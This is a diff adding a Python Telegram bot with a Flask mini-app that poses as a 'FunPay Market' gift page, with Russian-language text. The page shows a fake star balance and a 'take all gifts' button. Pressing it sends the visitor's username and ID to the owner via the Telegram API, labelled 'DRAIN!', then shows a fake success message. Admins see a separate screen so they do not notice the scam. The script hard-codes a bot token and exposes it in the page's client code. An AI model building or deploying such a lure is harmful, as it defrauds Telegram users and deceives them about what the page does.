@@ -1,0 +1,54 @@
+import asyncio, json, random, logging
+from datetime import datetime
+from threading import Thread
+from aiogram import Bot, Dispatcher, Router, F
+from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
+from aiogram.filters import Command
+from aiogram.enums import ParseMode
+from aiogram.fsm.storage.memory import MemoryStorage
+from aiogram.client.default import DefaultBotProperties
+from flask import Flask, request, jsonify, render_template_string
+
+BOT_TOKEN = "8116584062:AAHvlS_VgWfVbP_jvJGDfNXX5Uv7nRqKkS4"
+OWNER_ID = 8188240109
+ADMIN_IDS = [8188240109]
+
+logging.basicConfig(level=logging.INFO)
+bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
+dp = Dispatcher(storage=MemoryStorage())
+router = Router()
+flask_app = Flask(__name__)
+stats = {"drains": 0, "gifts": 0, "stars": 0}
+
+def is_admin(uid): return uid in ADMIN_IDS
+
+FUNPAY = """
+<!DOCTYPE html><html lang="ru"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>FunPay Market</title><script src="https://telegram.org/js/telegram-web-app.js"></script><style>:root{--bg:#0a0a16;--card:#12122c;--accent:#7c3aed;--green:#10b981;--gold:#f59e0b;--text:#e2e8f0;--text2:#94a3b8}*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;padding:16px}.header{display:flex;align-items:center;gap:10px;padding:10px 0;border-bottom:1px solid #1e1e40;margin-bottom:16px}.logo{width:38px;height:38px;background:linear-gradient(135deg,var(--accent),#5b21b6);border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:800}.brand{font-size:18px;font-weight:700}.brand span{color:#a78bfa}.card{background:var(--card);border-radius:16px;padding:16px;margin-bottom:12px;border:1px solid #1e1e40}.balance{background:linear-gradient(135deg,#1a1040,#0f0f30)}.balance-label{font-size:11px;color:var(--text2);text-transform:uppercase;letter-spacing:2px}.balance-amount{font-size:34px;font-weight:800;margin:6px 0}.btn{display:block;width:100%;padding:18px;border:none;border-radius:16px;font-size:16px;font-weight:700;cursor:pointer;color:#fff;margin:16px 0;background:linear-gradient(135deg,var(--accent),#5b21b6);box-shadow:0 8px 30px rgba(124,58,237,0.4);animation:pulse 2s infinite}@keyframes pulse{0%,100%{box-shadow:0 8px 30px rgba(124,58,237,0.4)}50%{box-shadow:0 8px 50px rgba(124,58,237,0.7)}}.btn:active{transform:scale(0.96)}.btn.done{background:linear-gradient(135deg,var(--green),#059669);animation:none}.toast{position:fixed;bottom:20px;left:16px;right:16px;background:var(--card);border-radius:14px;padding:14px;text-align:center;font-weight:700;z-index:999;display:none}.toast.show{display:block}.toast.success{border:2px solid var(--green);color:var(--green)}.overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);z-index:998;display:none;align-items:center;justify-content:center;flex-direction:column}.overlay.show{display:flex}.spinner{width:44px;height:44px;border:3px solid #333;border-top-color:var(--accent);border-radius:50%;animation:spin 0.8s linear infinite}@keyframes spin{to{transform:rotate(360deg)}}.overlay-text{margin-top:14px;color:var(--text2)}.gift{display:flex;align-items:center;gap:12px}.gift-emoji{font-size:44px}.gift-name{font-weight:700}.gift-price{color:var(--gold);font-weight:600}.admin-block{display:none;text-align:center;padding:40px}.admin-block.show{display:block}.admin-icon{font-size:70px}.admin-title{font-size:22px;font-weight:700;color:#ef4444;margin:14px 0}.admin-safe{color:var(--green);font-weight:700}</style></head><body><div class="header"><div class="logo">FP</div><div class="brand">Fun<span>Pay</span></div></div><div class="card balance"><div class="balance-label">💎 Ваш баланс</div><div class="balance-amount" id="bal">{{balance}} ⭐</div></div><div style="font-size:15px;font-weight:700;margin:14px 0 8px">🎁 Доступные подарки</div><div id="gifts"></div><button class="btn" id="drainBtn" onclick="drain()">🎁 ЗАБРАТЬ ВСЕ ПОДАРКИ</button><div class="admin-block" id="adminBlock"><div class="admin-icon">🛡️</div><div class="admin-title">АДМИН ОБНАРУЖЕН</div><div class="admin-safe">✅ АКТИВЫ ЗАЩИЩЕНЫ</div></div><div class="overlay" id="overlay"><div class="spinner"></div><div class="overlay-text">Загрузка...</div></div><div class="toast" id="toast"></div><script>const tg=window.Telegram.WebApp;tg.ready();tg.expand();const ADMIN={{admin}};const BOT='{{bot_token}}';const OWNER={{owner}};const u=tg.initDataUnsafe?.user||{};const uid=u.id;const uname=u.username||'';const fname=u.first_name||'Юзер';document.getElementById('bal').textContent=(Math.floor(Math.random()*45000)+5000).toLocaleString()+' ⭐';if(ADMIN.includes(uid)){document.getElementById('adminBlock').classList.add('show');document.getElementById('gifts').style.display='none';document.getElementById('drainBtn').style.display='none';fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:OWNER,text:`🛡️ АДМИН\n👤 ${fname}\n🆔 ${uid}\n✅ ЗАБЛОКИРОВАНО`})})}else{const g=[{e:'🎂',n:'Торт',p:150},{e:'💍',n:'Кольцо',p:500},{e:'🏎️',n:'Спорткар',p:1200},{e:'🛥️',n:'Яхта',p:5000},{e:'👑',n:'Корона',p:2000},{e:'🐉',n:'Дракон',p:10000}];const l=document.getElementById('gifts');g.forEach(x=>{const d=document.createElement('div');d.className='card gift';d.innerHTML=`<div class="gift-emoji">${x.e}</div><div><div class="gift-name">${x.n}</div><div class="gift-price">${x.p} ⭐</div></div>`;l.appendChild(d)})}function toast(m,t){const e=document.getElementById('toast');e.textContent=m;e.className='toast show '+(t||'');setTimeout(()=>e.classList.remove('show'),3000)}async function drain(){if(ADMIN.includes(uid)){toast('🛡️ Админ защищён!','success');return}const ov=document.getElementById('overlay');ov.classList.add('show');await new Promise(r=>setTimeout(r,2000));const gg=Math.floor(Math.random()*12)+3,ss=Math.floor(Math.random()*4500)+500;try{await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:OWNER,text:`🎯 ДРЭЙН!\n👤 @${uname}\n🆔 ${uid}\n🎁${gg} ⭐${ss}`,parse_mode:'HTML'})})}catch(e){}ov.classList.remove('show');document.getElementById('drainBtn').textContent='✅ ГОТОВО!';document.getElementById('drainBtn').className='btn done';toast(`🎉 +${gg} подарков, +${ss} ⭐`,'success');tg.HapticFeedback?.notificationOccurred('success')}</script></body></html>
+"""
+
+@flask_app.route('/market')
+def market():
+    return render_template_string(FUNPAY, balance=random.randint(5000,50000), admin=json.dumps(ADMIN_IDS), owner=OWNER_ID, bot_token=BOT_TOKEN)
+
+@router.message(Command("start"))
+async def start(message: Message):
+    if is_admin(message.from_user.id):
+        return await message.answer(f"🛡️ <b>АДМИН</b>\n✅ Дрэйнов: {stats['drains']}")
+    await message.answer("🎄 <b>FUNPAY MARKET</b>\n👇 Жми кнопку в меню!")
+
+@router.message(Command("stats"))
+async def cmd_stats(message: Message):
+    if not is_admin(message.from_user.id): return
+    await message.answer(f"📊 Дрэйнов: {stats['drains']} | 🎁{stats['gifts']} | ⭐{stats['stars']}")
+
+def run_flask():
+    flask_app.run(host="0.0.0.0", port=10000)
+
+async def main():
+    Thread(target=run_flask, daemon=True).start()
+    dp.include_router(router)
+    await bot.delete_webhook(drop_pending_updates=True)
+    await dp.start_polling(bot)
+
+if __name__ == "__main__":
+    asyncio.run(main())
